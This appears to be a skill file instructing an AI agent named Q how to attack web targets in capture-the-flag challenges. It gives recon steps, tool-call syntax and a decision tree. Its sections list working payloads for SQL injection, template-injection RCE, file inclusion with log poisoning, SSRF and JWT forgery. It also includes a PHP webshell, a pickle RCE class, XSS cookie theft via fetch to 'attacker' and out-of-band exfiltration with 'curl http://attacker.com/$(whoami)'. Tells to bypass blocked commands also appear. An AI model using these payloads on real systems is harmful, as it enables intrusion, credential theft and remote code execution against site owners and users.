# CTF Web Exploitation Skill

Quick reference. Recon fast, exploit targeted.

> **How to Use This Skill File:** This is a REFERENCE, not a script.
> Do NOT follow it top to bottom. Read the relevant section for YOUR
> challenge, understand the technique, adapt to THIS specific target,
> and form a hypothesis FIRST, then pick the right tool. Pick tools
> based on what you OBSERVE, not based on the order listed here.

---

## Decision Logic (use your brain, not a checklist)

What did recon tell you?
```
├── Found login form?
│   ├── Has username+password? → Try SQLi first
│   ├── Has JWT cookie? → Try JWT attacks first
│   └── Has OAuth/SSO? → Try redirect manipulation
├── Found input field (search, comment, etc)?
│   ├── Reflected in page? → Try XSS, SSTI
│   └── Used in query? → Try SQLi, NoSQLi
├── Found file parameter?
│   └── Try LFI → path traversal → RFI
├── Found API endpoint?
│   ├── Try IDOR (change IDs)
│   ├── Try mass assignment
│   └── Try SSRF if accepts URLs
└── Found nothing obvious?
    └── Check source, comments, JS files, robots.txt
```

Adapt: If approach A fails, don't just try approach B.
Think about WHY A failed. Is there a WAF? Wrong parameter?
Wrong endpoint? Use the error to guide your next attempt.

---

## Recon (Do This First for Live Targets)

### Mandatory Web Recon Chain (follow this order EVERY time)

```
Step 1: network GET /        → read HTML source: comments, real <a href> links, form actions, JS src
Step 2: network GET /robots.txt → ALWAYS check this. Often has passwords or hidden paths.
Step 3: follow REAL links found in HTML (actual hrefs, not guesses)
Step 4: ONLY if steps 1-3 yield nothing → recon(action="quick", target="http://target/")
Step 5: ONLY if quick recon not enough → gobuster
```

**Do NOT skip to gobuster/recon before reading the page source.** Most CTF flags are reachable from real links in the HTML.

### Reading HTML Source (Step 1)

```bash
network: GET http://target/
→ Look for:
  - HTML comments <!-- username: X, password: Y, hint: Z -->
  - <a href="/login.php"> → real links, always follow these
  - <form action="/submit"> → endpoints that accept input
  - <script src="/static/app.js"> → JS files worth reading
  - X-Powered-By header → PHP, Express, etc.
  - Set-Cookie header → session cookie names reveal tech stack
```

### robots.txt (Step 2 — ALWAYS check)

```bash
network: GET http://target/robots.txt
→ Disallow entries are HINTS. They often point directly to the flag path.
→ Content itself is sometimes a password or credential.
```

### Following Real Links (Step 3)

When HTML has `<a href="/login.php">`:
- That IS the login page. Fetch it. Don't guess `/login` without extension.
- Try the `.php` / `.html` / `.aspx` extension that matches the tech stack.
- If a path returns 404, try adding the extension:
  ```
  /login → 404? → try /login.php, /login.html, /login.aspx
  ```

### When to use the recon tool

Only after steps 1-3 fail:
```
recon(action="quick", target="http://target/")   → tech stack + headers
recon(action="gobuster", target="http://target/") → hidden paths (LAST RESORT)
recon(action="nmap", target="target")             → only if port scanning needed
```

**After recon you should know:** backend language, real endpoints, credentials hints.

---

## SQL Injection

```bash
# Detection
curl "http://target/search?q=test'"                      # Error = SQLi likely
curl "http://target/search?q=test' OR '1'='1"            # Boolean test
curl "http://target/search?q=test' UNION SELECT null--"  # Column count

# UNION-based extraction
' UNION SELECT 1,2,3--                           # Find visible columns
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--

# Blind SQLi (boolean)
' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--

# Time-based
' AND SLEEP(5)--                                  # MySQL
' AND pg_sleep(5)--                               # PostgreSQL

# sqlmap (if automated tools allowed)
sqlmap -u "http://target/search?q=test" --dbs --batch
sqlmap -u "http://target/search?q=test" -D dbname -T users --dump --batch
```

---

## Cross-Site Scripting (XSS)

```bash
# Basic test
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><img src=x onerror=alert(1)>

# Filter bypass
<ScRiPt>alert(1)</ScRiPt>                # Case bypass
<img src=x onerror="alert`1`">           # Backtick bypass
<svg/onload=alert(1)>                     # SVG event
javascript:alert(1)                       # Protocol handler

# Cookie stealing
<script>fetch('http://attacker/'+document.cookie)</script>
```

---

## Server-Side Template Injection (SSTI)

```bash
# Detection — inject in every input field
{{7*7}}        → 49 = Jinja2/Twig
${7*7}         → 49 = Freemarker/Velocity
<%= 7*7 %>     → 49 = ERB (Ruby)
#{7*7}         → 49 = Thymeleaf

# Jinja2 RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}

# Twig RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

---

## Local File Inclusion (LFI) / Path Traversal

```bash
# Basic
http://target/page?file=../../../../etc/passwd
http://target/page?file=....//....//....//etc/passwd    # Filter bypass

# PHP wrappers
http://target/page?file=php://filter/convert.base64-encode/resource=index.php
http://target/page?file=php://input    # POST body as code
http://target/page?file=data://text/plain,<?php system('id')?>

# Log poisoning (Apache)
# 1. Inject PHP in User-Agent via curl
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
# 2. Include log file
http://target/page?file=/var/log/apache2/access.log&cmd=cat+/flag.txt
```

---

## Server-Side Request Forgery (SSRF)

```bash
# Basic
http://target/fetch?url=http://127.0.0.1:8080/admin
http://target/fetch?url=file:///etc/passwd

# Bypass filters
http://0x7f000001/                       # Hex IP
http://127.1/                            # Short form
http://[::1]/                            # IPv6 localhost
http://target/fetch?url=http://attacker.com/redirect → http://127.0.0.1

# Cloud metadata
http://169.254.169.254/latest/meta-data/  # AWS
http://metadata.google.internal/          # GCP
```

---

## Authentication Bypass

```bash
# Default credentials
admin:admin  admin:password  admin:123456  root:root  guest:guest

# JWT manipulation
# 1. Decode: echo "JWT_TOKEN" | cut -d. -f2 | base64 -d
# 2. Change alg to "none": {"alg":"none","typ":"JWT"}
# 3. Change role: {"role":"admin"}
# 4. Reassemble with empty signature: header.payload.

# PHP type juggling
password=0        # "0" == "any_string_starting_with_non_number" is true
password[]=       # Array bypass: strcmp([], "password") = NULL = 0

# Mass assignment
POST /register {"username":"me","password":"pass","role":"admin"}
```

---

## Command Injection

```bash
# Detection
; id
| id
$(id)
`id`

# Blind (out-of-band)
; curl http://attacker.com/$(whoami)
; ping -c 1 attacker.com

# Filter bypass
;c'a't /flag.txt                    # Quote bypass
;cat${IFS}/flag.txt                 # Space bypass using IFS
;{cat,/flag.txt}                    # Brace expansion
```

---

## File Upload

```bash
# PHP webshell upload
# filename: shell.php, shell.php5, shell.phtml, shell.pHP
# content: <?php system($_GET['cmd']); ?>

# Bypass extension filter
shell.php.jpg                        # Double extension
shell.php%00.jpg                     # Null byte (old PHP)
shell.php/.                          # Path trick

# Bypass content-type check
# Set Content-Type: image/jpeg in request

# Access shell
curl "http://target/uploads/shell.php?cmd=cat+/flag.txt"
```

---

## Deserialization

```python
# Python pickle RCE
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))
print(base64.b64encode(pickle.dumps(Exploit())))
```

```php
# PHP deserialization
# Look for unserialize() on user input
# Craft object with __wakeup() or __destruct() magic methods
```

---

## Useful Tools

```bash
# Proxy
# Use Burp Suite or mitmproxy to intercept/modify requests

# Directory scan (if allowed)
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt

# CyberChef for encoding/decoding
# https://gchq.github.io/CyberChef/
```

---

## Browser Tool vs Network Tool

Use the **`network`** tool (curl-like) for:
- Simple HTTP requests (GET, POST)
- Checking headers, status codes, cookies
- Sending crafted payloads (SQLi, SSTI, etc.)
- Raw TCP connections

Use the **`browser`** tool (headless Chromium) for:
- Pages that require **JavaScript rendering** to show content
- **Multi-step form interactions** (login then navigate)
- Challenges that need a **real browser session** (cookies, CSRF tokens)
- **DOM inspection** after JS execution
- **Intercepting requests** made by client-side JavaScript
- **Cookie manipulation** in a browser context

### Browser Quick Reference

```
# Navigate to a page
browser(action="navigate", url="http://target/")

# Fill a form and submit
browser(action="type", selector="#username", text="admin")
browser(action="type", selector="#password", text="password")
browser(action="click", selector="button[type=submit]")

# Read page content after JS rendering
browser(action="get_text")
browser(action="get_html", selector="#flag-container")

# Run JavaScript in page context
browser(action="execute_js", script="document.cookie")

# List all forms and links for recon
browser(action="list_forms")
browser(action="list_links")

# Manipulate cookies
browser(action="get_cookies")
browser(action="set_cookie", cookie_name="role", cookie_value="admin")

# Make authenticated fetch from browser context
browser(action="send_request", url="http://target/api/flag", method="GET")

# Close when done
browser(action="browser_close")
```

**Rule of thumb:** ALWAYS start with `network` tool — never `browser` as first action.
Switch to `browser` only when you see JavaScript-dependent content, need stateful
sessions, or `network` results don't match what a real browser would see.

---

## White-Box Mode (when source code is available)

If code analysis results are provided in the system prompt:
1. Focus on the SPECIFIC files and lines mentioned
2. Craft payloads targeting the EXACT vulnerability pattern found
3. Don't waste time on generic scanning — you already know where to look
4. Read the vulnerable source file first to understand the exact logic

Priority order:
- critical findings first (SQLi, command injection, auth bypass, deserialization)
- then high findings (XSS, SSRF, path traversal)
- skip info/low findings unless nothing else works

---

## Decision Tree

After recon, follow this decision tree to pick your attack:

```
START -> Fetch / and robots.txt first (ALWAYS)
  |
  +-- robots.txt has hidden path or credential? → use it immediately
  |
  +-- HTML has real links (<a href>, form action)?
  |     +-- Follow ALL of them before guessing anything
  |     +-- Found /login.php, /portal.php, /admin.php? → go there next
  |
  +-- Login page?
  |     +-- Found credentials anywhere (comments, robots.txt)? → login NOW
  |     +-- Try default creds (admin:admin, admin:password)
  |     +-- Check for SQLi in login fields
  |     +-- Check for type juggling (PHP: password=0)
  |     +-- Look for registration -> mass assignment (add role=admin)
  |     +-- Check for JWT -> try none alg / weak secret
  |
  +-- Search/input field?
  |     +-- Test for SQLi: add ' to input
  |     |     +-- Error? -> UNION-based extraction
  |     |     +-- No error but different response? -> Blind boolean
  |     |     +-- Nothing? -> Try time-based: ' AND SLEEP(5)--
  |     +-- Test for SSTI: {{7*7}}
  |     |     +-- 49 in response? -> Jinja2/Twig RCE
  |     +-- Test for XSS: <script>alert(1)</script>
  |     +-- Test for command injection: ; id
  |
  +-- File parameter (file=, page=, include=)?
  |     +-- LFI: ../../../../etc/passwd
  |     +-- PHP? -> php://filter wrappers for source code
  |     +-- Log poisoning for RCE
  |
  +-- URL/fetch parameter?
  |     +-- SSRF: http://127.0.0.1/, file:///etc/passwd
  |     +-- Cloud metadata: http://169.254.169.254/
  |
  +-- File upload?
  |     +-- Upload PHP shell (.php, .phtml, .php5)
  |     +-- Bypass: double ext, null byte, content-type
  |
  +-- API endpoint?
  |     +-- Check auth (JWT, API key)
  |     +-- IDOR: change user ID in requests
  |     +-- Mass assignment in PUT/PATCH
  |
  +-- 403 Forbidden on interesting path?
  |     +-- Header bypass: X-Forwarded-For: 127.0.0.1
  |     +-- Path tricks: /admin..;/ or //admin
  |
  +-- Nothing obvious?
        +-- View page source for HTML comments
        +-- Check JS files for API endpoints/secrets
        +-- Check .git/HEAD, .env, sitemap.xml
        +-- Run gobuster for hidden paths (last resort)
```

---

## Visual Analysis (Vision Mode)

Q can SEE web pages via screenshots. Use this for:

### When to look at screenshots:
- Page loaded but text content seems empty → flag might be in image/canvas
- Challenge mentions "look carefully" or "what do you see"
- After login/action → check if flag appears visually
- Suspect hidden text (white text on white background, tiny font)

### When to download images:
- See an `<img>` tag that looks suspicious
- Challenge is about steganography
- Image filename looks interesting (flag.png, secret.jpg, hidden.bmp)

### Workflow:
1. `browser(action="navigate", url="...")` → auto-screenshot → model sees page
2. See interesting image? → `browser(action="download_image", selector="img#flag")` → model analyzes
3. Need steg analysis? → download image → run steg tools on saved file:
   ```
   shell: steghide extract -sf sessions/screenshots/image_1.jpg
   shell: zsteg sessions/screenshots/image_1.png
   shell: exiftool sessions/screenshots/image_1.png
   shell: strings sessions/screenshots/image_1.png | grep -i flag
   ```

### Visual clues to watch for:
- Text rendered in images or canvas (not in HTML)
- QR codes embedded in page
- Hidden elements (opacity: 0, display: none) — check via execute_js
- Tiny or same-color text — reveal with:
  ```
  browser(action="execute_js", script="document.querySelectorAll('*').forEach(e => e.style.color = 'red')")
  browser(action="screenshot")
  ```

---

## CRITICAL RULES FOR AGENT

1. **network first, browser never first** — first action is always `network GET /`, never `browser` or `recon`
2. **robots.txt is step 2, always** — check it before ANY scanning or guessing
3. **Follow real links** — extract actual `<a href>` from HTML and follow them; don't guess paths
4. **Try .php extension** — if /path 404s and tech is PHP, try /path.php immediately
5. **Credentials → login immediately** — if you find username/password anywhere, stop recon and login NOW
6. **cat blocked? bypass it** — try `less`, `more`, `head`, `tail`, `python3 -c "print(open('f').read())"`
7. **Try simple payloads before complex ones**
8. **Don't brute force** unless CTF explicitly allows it
9. **Check cookies and headers** — flags sometimes hide there
10. **Track what you tried** — don't repeat failed approaches
